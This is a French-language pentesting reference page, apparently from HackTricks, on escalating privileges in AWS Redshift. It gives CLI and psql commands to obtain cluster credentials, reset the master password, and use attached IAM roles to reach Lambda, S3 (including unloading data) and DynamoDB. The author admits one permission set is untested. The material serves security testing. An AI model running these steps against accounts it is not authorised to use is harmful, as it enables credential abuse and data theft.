# AWS - Redshift Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## Redshift

Pour plus d'informations sur RDS, consultez :

{{#ref}}
../../aws-services/aws-redshift-enum.md
{{#endref}}

### `redshift:DescribeClusters`, `redshift:GetClusterCredentials`

Avec ces permissions, vous pouvez obtenir **les informations de tous les clusters** (y compris le nom et le nom d'utilisateur du cluster) et **obtenir des identifiants** pour y accéder :
```bash
# Get creds
aws redshift get-cluster-credentials --db-user postgres --cluster-identifier redshift-cluster-1
# Connect, even if the password is a base64 string, that is the password
psql -h redshift-cluster-1.asdjuezc439a.us-east-1.redshift.amazonaws.com -U "IAM:<username>" -d template1 -p 5439
```
**Impact potentiel:** Trouver des informations sensibles dans les bases de données.

### `redshift:DescribeClusters`, `redshift:GetClusterCredentialsWithIAM`

Avec ces permissions vous pouvez obtenir **les informations de tous les clusters** et **les identifiants** pour y accéder.\
Remarque : l'utilisateur postgres aura les **permissions que possède l'identité IAM** utilisée pour obtenir les identifiants.
```bash
# Get creds
aws redshift get-cluster-credentials-with-iam --cluster-identifier redshift-cluster-1
# Connect, even if the password is a base64 string, that is the password
psql -h redshift-cluster-1.asdjuezc439a.us-east-1.redshift.amazonaws.com -U "IAMR:AWSReservedSSO_AdministratorAccess_4601154638985c45" -d template1 -p 5439
```
**Impact potentiel:** Find sensitive info inside the databases.

### `redshift:DescribeClusters`, `redshift:ModifyCluster?`

Il est possible de **modifier le mot de passe maître** de l'utilisateur interne postgres (redshit) depuis aws cli (je pense que ce sont les permissions nécessaires mais je ne les ai pas encore testées) :
```
aws redshift modify-cluster –cluster-identifier <identifier-for-the cluster> –master-user-password ‘master-password’;
```
**Impact potentiel :** Trouver des informations sensibles dans les bases de données.

## Accès aux services externes

> [!WARNING]
> Pour accéder à toutes les ressources suivantes, vous devrez **spécifier le rôle à utiliser**. Un cluster Redshift **peut avoir une liste de rôles AWS assignés** que vous pouvez utiliser **si vous connaissez l'ARN** ou vous pouvez simplement définir "**default**" pour utiliser celui qui est assigné par défaut.

> De plus, comme [**expliqué ici**](https://docs.aws.amazon.com/redshift/latest/mgmt/authorizing-redshift-service.html), Redshift permet aussi de concaténer des rôles (tant que le premier peut assumer le second) pour obtenir des accès supplémentaires, mais il suffit de les **séparer** par une **virgule**: `iam_role 'arn:aws:iam::123456789012:role/RoleA,arn:aws:iam::210987654321:role/RoleB';`

### Lambdas

Comme expliqué dans [https://docs.aws.amazon.com/redshift/latest/dg/r_CREATE_EXTERNAL_FUNCTION.html](https://docs.aws.amazon.com/redshift/latest/dg/r_CREATE_EXTERNAL_FUNCTION.html), il est possible d'**appeler une fonction lambda depuis Redshift** avec quelque chose comme :
```sql
CREATE EXTERNAL FUNCTION exfunc_sum2(INT,INT)
RETURNS INT
STABLE
LAMBDA 'lambda_function'
IAM_ROLE default;
```
### S3

Comme expliqué dans [https://docs.aws.amazon.com/redshift/latest/dg/tutorial-loading-run-copy.html](https://docs.aws.amazon.com/redshift/latest/dg/tutorial-loading-run-copy.html), il est possible de **lire et d'écrire dans les S3 buckets**:
```sql
# Read
copy table from 's3://<your-bucket-name>/load/key_prefix'
credentials 'aws_iam_role=arn:aws:iam::<aws-account-id>:role/<role-name>'
region '<region>'
options;

# Write
unload ('select * from venue')
to 's3://mybucket/tickit/unload/venue_'
iam_role default;
```
### Dynamo

Comme expliqué dans [https://docs.aws.amazon.com/redshift/latest/dg/t_Loading-data-from-dynamodb.html](https://docs.aws.amazon.com/redshift/latest/dg/t_Loading-data-from-dynamodb.html), il est possible de **récupérer des données depuis dynamodb** :
```sql
copy favoritemovies
from 'dynamodb://ProductCatalog'
iam_role 'arn:aws:iam::0123456789012:role/MyRedshiftRole';
```
> [!WARNING]
> La table Amazon DynamoDB qui fournit les données doit être créée dans la même AWS Region que votre cluster, sauf si vous utilisez l'option [REGION](https://docs.aws.amazon.com/redshift/latest/dg/copy-parameters-data-source-s3.html#copy-region) pour spécifier la AWS Region où se trouve la table Amazon DynamoDB.

### EMR

Consultez [https://docs.aws.amazon.com/redshift/latest/dg/loading-data-from-emr.html](https://docs.aws.amazon.com/redshift/latest/dg/loading-data-from-emr.html)

## Références

- [https://gist.github.com/kmcquade/33860a617e651104d243c324ddf7992a](https://gist.github.com/kmcquade/33860a617e651104d243c324ddf7992a)

{{#include ../../../../banners/hacktricks-training.md}}
